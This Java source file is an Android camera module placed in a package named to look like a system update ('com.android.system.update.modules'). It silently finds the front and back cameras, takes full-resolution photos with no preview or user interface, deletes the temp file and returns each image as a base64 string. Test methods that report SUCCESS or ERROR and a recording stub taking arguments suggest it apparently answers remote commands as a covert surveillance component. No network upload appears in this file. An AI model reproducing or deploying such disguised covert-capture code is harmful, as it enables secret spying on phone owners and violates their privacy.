package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Size;
import androidx.core.app.ActivityCompat;
import android.graphics.ImageFormat;
import android.os.Looper;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import java.util.Arrays;

public class CameraModule {
    private static final String TAG = "CameraModule";
    private Context context;
    private CameraManager cameraManager;
    private String currentCameraId;
    private String backCameraId;
    private String frontCameraId;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private Handler mainHandler;
    private boolean isUsingFrontCamera = false;
    
    public CameraModule(Context context) {
        Log.d(TAG, "📸 CameraModule constructor called");
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        this.mainHandler = new Handler(Looper.getMainLooper());
        startBackgroundThread();
        
        Log.d(TAG, "📸 CameraManager obtained: " + (cameraManager != null));
        
        // Find both front and back cameras
        findCameras();
    }
    
    private void findCameras() {
        try {
            String[] cameraIdList = cameraManager.getCameraIdList();
            Log.d(TAG, "📸 Available cameras: " + Arrays.toString(cameraIdList));
            
            for (String id : cameraIdList) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                Log.d(TAG, "📸 Camera " + id + " facing: " + facing);
                
                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        backCameraId = id;
                        Log.d(TAG, "📸 Found back camera: " + id);
                    } else if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        frontCameraId = id;
                        Log.d(TAG, "📸 Found front camera: " + id);
                    }
                }
            }
            
            // Set default camera (prefer back, then front, then first available)
            if (backCameraId != null) {
                currentCameraId = backCameraId;
                isUsingFrontCamera = false;
                Log.d(TAG, "📸 Using back camera: " + currentCameraId);
            } else if (frontCameraId != null) {
                currentCameraId = frontCameraId;
                isUsingFrontCamera = true;
                Log.d(TAG, "📸 Using front camera: " + currentCameraId);
            } else if (cameraIdList.length > 0) {
                currentCameraId = cameraIdList[0];
                Log.d(TAG, "📸 Using first available camera: " + currentCameraId);
            } else {
                Log.e(TAG, "❌ No cameras found");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error finding cameras", e);
        }
    }
    
    public String switchCamera() {
        Log.d(TAG, "🔄 switchCamera() called");
        
        if (frontCameraId == null && backCameraId == null) {
            Log.e(TAG, "❌ No front or back camera available");
            return "ERROR: No front or back camera available";
        }
        
        // Toggle between front and back
        if (isUsingFrontCamera) {
            if (backCameraId != null) {
                currentCameraId = backCameraId;
                isUsingFrontCamera = false;
                Log.d(TAG, "🔄 Switched to back camera: " + currentCameraId);
                return "SUCCESS: Switched to back camera";
            } else {
                Log.e(TAG, "❌ No back camera available");
                return "ERROR: No back camera available";
            }
        } else {
            if (frontCameraId != null) {
                currentCameraId = frontCameraId;
                isUsingFrontCamera = true;
                Log.d(TAG, "🔄 Switched to front camera: " + currentCameraId);
                return "SUCCESS: Switched to front camera";
            } else {
                Log.e(TAG, "❌ No front camera available");
                return "ERROR: No front camera available";
            }
        }
    }
    
    public String getCurrentCamera() {
        return isUsingFrontCamera ? "front" : "back";
    }
    
    public String takePhoto() {
        Log.d(TAG, "📸 takePhoto() called with camera: " + currentCameraId + (isUsingFrontCamera ? " (front)" : " (back)"));
        
        if (!checkPermission()) {
            Log.e(TAG, "❌ No camera permission");
            return "ERROR: No camera permission";
        }
        
        if (currentCameraId == null) {
            Log.e(TAG, "❌ No camera ID available");
            return "ERROR: No camera available";
        }
        
        try {
            // Create temp file
            File photoFile = File.createTempFile("photo", ".jpg", 
                context.getExternalFilesDir(null));
            Log.d(TAG, "📁 Temp file created: " + photoFile.getAbsolutePath());
            
            // Create a latch to wait for the photo to be captured
            CountDownLatch latch = new CountDownLatch(1);
            AtomicReference<String> result = new AtomicReference<>("ERROR: Timeout");
            
            // Open camera and capture on background thread
            backgroundHandler.post(() -> {
                try {
                    Log.d(TAG, "🔄 Starting capture on background thread");
                    capturePhotoSync(photoFile, latch, result);
                } catch (Exception e) {
                    Log.e(TAG, "❌ Error in capture thread", e);
                    result.set("ERROR: " + e.getMessage());
                    latch.countDown();
                }
            });
            
            Log.d(TAG, "⏳ Waiting for capture to complete...");
            // Wait for capture to complete (max 15 seconds)
            if (latch.await(15000, TimeUnit.MILLISECONDS)) {
                String photoResult = result.get();
                Log.d(TAG, "✅ Capture completed with result: " + photoResult);
                
                // Check if file exists and has content
                if (photoFile.exists()) {
                    long fileSize = photoFile.length();
                    Log.d(TAG, "📁 File exists, size: " + fileSize + " bytes");
                    
                    if (fileSize > 0) {
                        try {
                            byte[] bytes = readFileToBytes(photoFile);
                            Log.d(TAG, "📸 Read " + bytes.length + " bytes from file");
                            
                            if (bytes.length > 0) {
                                String base64 = Base64.encodeToString(bytes, Base64.DEFAULT);
                                Log.d(TAG, "✅ Base64 encoded, length: " + base64.length());
                                
                                // Clean up the file
                                photoFile.delete();
                                Log.d(TAG, "📁 Temp file deleted");
                                
                                return "data:image/jpeg;base64," + base64;
                            } else {
                                Log.e(TAG, "❌ Captured photo is empty");
                                return "ERROR: Captured photo is empty";
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "❌ Error reading photo file", e);
                            return "ERROR: Failed to read photo: " + e.getMessage();
                        }
                    } else {
                        Log.e(TAG, "❌ Photo file is empty");
                        return "ERROR: Photo file is empty";
                    }
                } else {
                    Log.e(TAG, "❌ Photo file does not exist");
                    return "ERROR: Photo file not created";
                }
            } else {
                Log.e(TAG, "❌ Camera timeout - took too long to capture");
                return "ERROR: Camera timeout - took too long to capture";
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error taking photo", e);
            return "ERROR: " + e.getMessage();
        }
    }
    public String testCapture() {
    Log.d(TAG, "📸 testCapture() called");
    if (!checkPermission()) {
        return "ERROR: No camera permission";
    }
    
    try {
        // Try to open camera briefly
        CameraDevice testDevice = null;
        CountDownLatch latch = new CountDownLatch(1);
        AtomicReference<String> result = new AtomicReference<>("Failed");
        
        cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
            @Override
            public void onOpened(CameraDevice device) {
                Log.d(TAG, "✅ Test camera opened successfully");
                device.close();
                result.set("SUCCESS");
                latch.countDown();
            }
            
            @Override
            public void onDisconnected(CameraDevice device) {
                Log.e(TAG, "❌ Test camera disconnected");
                result.set("ERROR: Disconnected");
                latch.countDown();
            }
            
            @Override
            public void onError(CameraDevice device, int error) {
                Log.e(TAG, "❌ Test camera error: " + error);
                result.set("ERROR: " + error);
                latch.countDown();
            }
        }, backgroundHandler);
        
        if (latch.await(5000, TimeUnit.MILLISECONDS)) {
            return result.get();
        } else {
            return "ERROR: Timeout opening camera";
        }
    } catch (Exception e) {
        Log.e(TAG, "❌ testCapture failed", e);
        return "ERROR: " + e.getMessage();
    }
}
    private void capturePhotoSync(File photoFile, CountDownLatch latch, AtomicReference<String> result) {
        CameraDevice cameraDevice = null;
        ImageReader imageReader = null;
        CameraCaptureSession captureSession = null;
        
        try {
            Log.d(TAG, "📸 capturePhotoSync started for camera: " + currentCameraId);
            
            // Get the largest size
            Size largest = getLargestSize();
            Log.d(TAG, "📐 Using size: " + largest.getWidth() + "x" + largest.getHeight());
            
            // Create ImageReader
            imageReader = ImageReader.newInstance(largest.getWidth(), 
                largest.getHeight(), ImageFormat.JPEG, 2);
            Log.d(TAG, "🖼️ ImageReader created");
            
            // Set up the ImageAvailableListener
            imageReader.setOnImageAvailableListener(reader -> {
                Log.d(TAG, "📸 Image available listener triggered");
                try (Image image = reader.acquireLatestImage()) {
                    if (image == null) {
                        Log.e(TAG, "❌ Acquired image is null");
                        return;
                    }
                    
                    Log.d(TAG, "📸 Image acquired, format: " + image.getFormat() + 
                          ", size: " + image.getWidth() + "x" + image.getHeight());
                    
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    
                    Log.d(TAG, "📸 Image bytes read: " + bytes.length);
                    
                    // Write to file
                    try (FileOutputStream fos = new FileOutputStream(photoFile)) {
                        fos.write(bytes);
                        fos.flush();
                        Log.d(TAG, "✅ Photo saved: " + photoFile.getAbsolutePath() + 
                              " size: " + bytes.length + " bytes");
                        result.set("SUCCESS");
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error saving photo", e);
                        result.set("ERROR: Failed to save: " + e.getMessage());
                    }
                } catch (Exception e) {
                    Log.e(TAG, "❌ Error processing image", e);
                    result.set("ERROR: " + e.getMessage());
                } finally {
                    Log.d(TAG, "🔽 Signaling latch from ImageAvailableListener");
                    latch.countDown();
                }
            }, backgroundHandler);
            
            // Open camera synchronously
            Log.d(TAG, "🔓 Opening camera: " + currentCameraId);
            CountDownLatch openLatch = new CountDownLatch(1);
            AtomicReference<CameraDevice> deviceRef = new AtomicReference<>();
            AtomicReference<String> openError = new AtomicReference<>();
            
            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    Log.d(TAG, "✅ Camera opened successfully");
                    deviceRef.set(device);
                    openLatch.countDown();
                }
                
                @Override
                public void onDisconnected(CameraDevice device) {
                    Log.w(TAG, "⚠️ Camera disconnected");
                    device.close();
                    openError.set("Camera disconnected");
                    openLatch.countDown();
                }
                
                @Override
                public void onError(CameraDevice device, int error) {
                    Log.e(TAG, "❌ Camera error: " + error);
                    device.close();
                    openError.set("Camera error: " + error);
                    openLatch.countDown();
                }
            }, backgroundHandler);
            
            // Wait for camera to open
            if (!openLatch.await(5000, TimeUnit.MILLISECONDS)) {
                Log.e(TAG, "❌ Camera open timeout");
                result.set("ERROR: Camera open timeout");
                latch.countDown();
                return;
            }
            
            if (openError.get() != null) {
                Log.e(TAG, "❌ Camera open error: " + openError.get());
                result.set("ERROR: " + openError.get());
                latch.countDown();
                return;
            }
            
            cameraDevice = deviceRef.get();
            if (cameraDevice == null) {
                Log.e(TAG, "❌ Camera device is null");
                result.set("ERROR: Camera device is null");
                latch.countDown();
                return;
            }
            
            // Create capture session
            Log.d(TAG, "🔧 Creating capture session");
            CountDownLatch sessionLatch = new CountDownLatch(1);
            AtomicReference<CameraCaptureSession> sessionRef = new AtomicReference<>();
            AtomicReference<String> sessionError = new AtomicReference<>();
            
            cameraDevice.createCaptureSession(
                java.util.Collections.singletonList(imageReader.getSurface()),
                new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(CameraCaptureSession session) {
                        Log.d(TAG, "✅ Capture session configured");
                        sessionRef.set(session);
                        sessionLatch.countDown();
                    }
                    
                    @Override
                    public void onConfigureFailed(CameraCaptureSession session) {
                        Log.e(TAG, "❌ Capture session configure failed");
                        sessionError.set("Session configure failed");
                        sessionLatch.countDown();
                    }
                }, backgroundHandler
            );
            
            // Wait for session to be configured
            if (!sessionLatch.await(5000, TimeUnit.MILLISECONDS)) {
                Log.e(TAG, "❌ Session configure timeout");
                result.set("ERROR: Session configure timeout");
                latch.countDown();
                return;
            }
            
            if (sessionError.get() != null) {
                Log.e(TAG, "❌ Session error: " + sessionError.get());
                result.set("ERROR: " + sessionError.get());
                latch.countDown();
                return;
            }
            
            captureSession = sessionRef.get();
            if (captureSession == null) {
                Log.e(TAG, "❌ Capture session is null");
                result.set("ERROR: Capture session is null");
                latch.countDown();
                return;
            }
            
            // Create capture request
            Log.d(TAG, "📸 Creating capture request");
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(
                CameraDevice.TEMPLATE_STILL_CAPTURE);
            builder.addTarget(imageReader.getSurface());
            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
            
            // Set auto-focus if available
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            int[] afModes = chars.get(CameraCharacteristics.CONTROL_AF_AVAILABLE_MODES);
            if (afModes != null && afModes.length > 0) {
                builder.set(CaptureRequest.CONTROL_AF_MODE, 
                    CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                Log.d(TAG, "🔍 Auto-focus enabled");
            }
            
            // Set flash mode to auto if available
            Boolean flashAvailable = chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
            if (flashAvailable != null && flashAvailable) {
                builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
                Log.d(TAG, "⚡ Flash set to auto");
            }
            
            // Capture
            Log.d(TAG, "📸 Capturing...");
            CountDownLatch captureLatch = new CountDownLatch(1);
            captureSession.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                @Override
                public void onCaptureStarted(CameraCaptureSession session, 
                        CaptureRequest request, long timestamp, long frameNumber) {
                    Log.d(TAG, "📸 Capture started at timestamp: " + timestamp);
                }
                
                @Override
                public void onCaptureCompleted(CameraCaptureSession session, 
                        CaptureRequest request, TotalCaptureResult result) {
                    Log.d(TAG, "✅ Capture completed");
                    captureLatch.countDown();
                }
                
                @Override
                public void onCaptureFailed(CameraCaptureSession session, 
                        CaptureRequest request, CaptureFailure failure) {
                    Log.e(TAG, "❌ Capture failed: " + failure.getReason());
                    result.set("ERROR: Capture failed");
                    captureLatch.countDown();
                }
            }, backgroundHandler);
            
            // Wait for capture to complete
            if (!captureLatch.await(5000, TimeUnit.MILLISECONDS)) {
                Log.e(TAG, "❌ Capture timeout");
                result.set("ERROR: Capture timeout");
                latch.countDown();
                return;
            }
            
            Log.d(TAG, "✅ Capture process completed, waiting for image...");
            // Give time for the image listener to process
            Thread.sleep(1000);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error in captureSync", e);
            result.set("ERROR: " + e.getMessage());
            latch.countDown();
        } finally {
            // Clean up properly
            Log.d(TAG, "🧹 Cleaning up camera resources");
            try {
                if (captureSession != null) {
                    captureSession.close();
                    Log.d(TAG, "✅ Capture session closed");
                }
                if (imageReader != null) {
                    imageReader.close();
                    Log.d(TAG, "✅ ImageReader closed");
                }
                if (cameraDevice != null) {
                    cameraDevice.close();
                    Log.d(TAG, "✅ Camera device closed");
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Error closing camera resources", e);
            }
        }
    }
    
    public String testCamera() {
        Log.d(TAG, "🔧 Testing camera module");
        if (!checkPermission()) {
            return "ERROR: No camera permission";
        }
        
        try {
            String[] cameraIds = cameraManager.getCameraIdList();
            Log.d(TAG, "Available cameras: " + Arrays.toString(cameraIds));
            
            if (currentCameraId == null) {
                return "ERROR: No camera selected";
            }
            
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
            String facingStr = facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : 
                              (facing == CameraCharacteristics.LENS_FACING_FRONT ? "FRONT" : "OTHER");
            
            return "SUCCESS: Camera " + currentCameraId + " (" + facingStr + ") is available";
        } catch (Exception e) {
            Log.e(TAG, "❌ Camera test failed", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String simpleTest() {
        Log.d(TAG, "🔧 Simple camera test");
        if (!checkPermission()) {
            return "ERROR: No camera permission";
        }
        
        try {
            if (currentCameraId == null) {
                return "ERROR: No camera selected";
            }
            
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            Integer level = chars.get(CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL);
            String levelStr;
            switch (level) {
                case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_FULL:
                    levelStr = "FULL";
                    break;
                case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LIMITED:
                    levelStr = "LIMITED";
                    break;
                case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LEGACY:
                    levelStr = "LEGACY";
                    break;
                case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_3:
                    levelStr = "LEVEL_3";
                    break;
                default:
                    levelStr = "UNKNOWN";
            }
            return "SUCCESS: Camera hardware level: " + levelStr;
        } catch (Exception e) {
            Log.e(TAG, "❌ Simple test failed", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String simpleCapture() {
        Log.d(TAG, "📸 simpleCapture() called");
        if (!checkPermission()) {
            return "ERROR: No camera permission";
        }
        
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            Log.d(TAG, "📸 Camera characteristics: " + chars.get(CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL));
            return "SUCCESS: Camera accessible";
        } catch (Exception e) {
            Log.e(TAG, "❌ simpleCapture failed", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    private byte[] readFileToBytes(File file) throws Exception {
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            return bytes;
        }
    }
    
    public void startRecording(String args) {
        if (!checkPermission()) return;
        // Recording implementation would go here
        Log.d(TAG, "Recording started (stub)");
    }
    
    public String stopRecording() {
        Log.d(TAG, "Recording stopped (stub)");
        return "Recording stopped";
    }
    
    private Size getLargestSize() {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            StreamConfigurationMap configs = chars.get(
                CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (configs == null) {
                return new Size(1920, 1080);
            }
            
            Size[] sizes = configs.getOutputSizes(ImageFormat.JPEG);
            if (sizes == null || sizes.length == 0) {
                return new Size(1920, 1080);
            }
            
            Size largest = sizes[0];
            for (Size size : sizes) {
                if (size.getWidth() > largest.getWidth()) {
                    largest = size;
                }
            }
            return largest;
        } catch (Exception e) {
            Log.e(TAG, "Error getting largest size", e);
            return new Size(1920, 1080);
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
}
